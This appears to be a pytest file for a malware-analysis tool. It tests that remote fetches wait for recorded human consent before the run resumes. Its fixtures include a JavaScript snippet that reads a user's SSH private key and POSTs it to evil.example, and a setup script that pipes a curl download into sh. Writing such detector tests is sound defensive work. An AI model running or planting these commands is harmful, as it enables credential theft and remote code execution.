"""Durable questions — human-in-the-loop without blocking.

A node that needs a decision records a durable question; the run finishes `needs_input`
(never a blocking wait); the orchestrator answers and resumes, and the asking node reads
its answer from the ledger. Demonstrator: fetch consent (--confirm-fetch).
"""

from __future__ import annotations

import hashlib
import json
import os
from pathlib import Path

from unmask import MCDConfig, resume_mcd, run_mcd

_EXFIL_JS = (
    'const fs=require("fs");\nconst http=require("http");\n'
    'const k=fs.readFileSync(process.env.HOME+"/.ssh/id_rsa");\n'
    'http.request({host:"evil.example",method:"POST"}).end(k);\n'
)


def _fake_fetch(url, dest_dir, policy=None, *, resolver=None):
    from unmask.net import FetchResult
    os.makedirs(dest_dir, exist_ok=True)
    out = os.path.join(dest_dir, "payload.js")
    Path(out).write_text(_EXFIL_JS)
    data = _EXFIL_JS.encode()
    return FetchResult(url=url, ok=True, path=out, status=200, bytes_len=len(data),
                       sha256=hashlib.sha256(data).hexdigest(), final_url=url)


def _pkg(tmp_path):
    d = tmp_path / "pkg"
    d.mkdir()
    (d / "setup.sh").write_text("#!/bin/sh\ncurl -fsSL https://evil.example/install.sh | sh\n")
    return d


def _report(result):
    return json.loads(Path(result.report_paths["json"]).read_text())


# --- ledger unit -----------------------------------------------------------

def test_ledger_question_answer_roundtrip(tmp_path):
    from unmask.ledger import LedgerStore
    led = LedgerStore(str(tmp_path / "q.db"))
    led.create_run(run_id="r1", project_id="p", target_path="/t", target_root="/t",
                   storage_root="/s", run_dir="/d", config_json="{}")
    led.ask_question("r1", qid="q1", node="N", kind="fetch-consent", prompt="Fetch?", options=["yes", "no"])
    assert led.count_pending_questions("r1") == 1
    assert led.get_answer("r1", "q1") is None
    led.record_answer("r1", "q1", "yes")
    assert led.get_answer("r1", "q1") == "yes"
    assert led.count_pending_questions("r1") == 0  # answered → not pending
    # answers survive the derived reset; questions are regenerated
    led.reset_run_derived("r1")
    assert led.get_answer("r1", "q1") == "yes"
    led.close()


# --- flow ------------------------------------------------------------------

def test_confirm_fetch_yields_needs_input(tmp_path, monkeypatch):
    import unmask.net as netpkg
    monkeypatch.setattr(netpkg, "fetch", _fake_fetch)
    result = run_mcd(str(_pkg(tmp_path)),
                     MCDConfig(storage_root=str(tmp_path / ".mcd"), network="fetch-only", confirm_fetch=True))
    assert result.status == "needs_input"
    from unmask.run import pending_questions_of
    pending = pending_questions_of(result.run_dir)
    assert len(pending) == 1 and pending[0]["kind"] == "fetch-consent"
    # no fetch happened → only the static dropper, not the exfil payload
    comps = set(_report(result)["summary"].get("compositions") or [])
    assert "BP-EXFIL" not in comps


def test_needs_input_report_json_digest_matches_disk(tmp_path, monkeypatch):
    """The `reports` row's recorded sha256 must match report.json on disk even for a
    needs_input run — the pending-questions block is folded in BEFORE the file is hashed,
    not appended after (else every audited needs_input report has a stale digest)."""
    import unmask.net as netpkg
    monkeypatch.setattr(netpkg, "fetch", _fake_fetch)
    result = run_mcd(str(_pkg(tmp_path)),
                     MCDConfig(storage_root=str(tmp_path / ".mcd"), network="fetch-only", confirm_fetch=True))
    assert result.status == "needs_input"
    report_path = Path(result.report_paths["json"])
    assert "questions" in json.loads(report_path.read_text())  # the block that used to land post-hash
    on_disk = hashlib.sha256(report_path.read_bytes()).hexdigest()

    from muster.paths import resolve_run_dir
    from unmask.ledger import LedgerStore
    led = LedgerStore(str(resolve_run_dir(result.run_dir).db_path))
    try:
        row = led.conn.execute(
            "select sha256 from reports where run_id=? and format='json'", (result.run_id,)).fetchone()
    finally:
        led.close()
    assert row is not None and row["sha256"] == on_disk


def test_answer_yes_resume_fetches(tmp_path, monkeypatch):
    import unmask.net as netpkg
    monkeypatch.setattr(netpkg, "fetch", _fake_fetch)
    r1 = run_mcd(str(_pkg(tmp_path)),
                 MCDConfig(storage_root=str(tmp_path / ".mcd"), network="fetch-only", confirm_fetch=True))
    from unmask.run import pending_questions_of
    qid = pending_questions_of(r1.run_dir)[0]["id"]
    r2 = resume_mcd(r1.run_dir, answers={qid: "yes"})
    assert r2.status == "completed"
    comps = set(_report(r2)["summary"].get("compositions") or [])
    assert {"BP-EXFIL", "BP-CREDTHEFT"} & comps  # the fetched payload was analysed


def test_answer_no_resume_declines(tmp_path, monkeypatch):
    import unmask.net as netpkg
    calls = {"n": 0}

    def _counting(*a, **k):
        calls["n"] += 1
        return _fake_fetch(*a, **k)

    monkeypatch.setattr(netpkg, "fetch", _counting)
    r1 = run_mcd(str(_pkg(tmp_path)),
                 MCDConfig(storage_root=str(tmp_path / ".mcd"), network="fetch-only", confirm_fetch=True))
    from unmask.run import pending_questions_of
    qid = pending_questions_of(r1.run_dir)[0]["id"]
    r2 = resume_mcd(r1.run_dir, answers={qid: "no"})
    assert r2.status == "completed" and calls["n"] == 0  # never fetched
    comps = set(_report(r2)["summary"].get("compositions") or [])
    assert "BP-EXFIL" not in comps


def test_cli_answer_parsing_and_mcp_tools():
    from unmask.cli import _cmd_resume  # noqa: F401 (import guard)
    from unmask.mcp_server import build_server
    import asyncio
    names = {t.name for t in asyncio.run(build_server().list_tools())}
    assert {"questions", "resume"} <= names
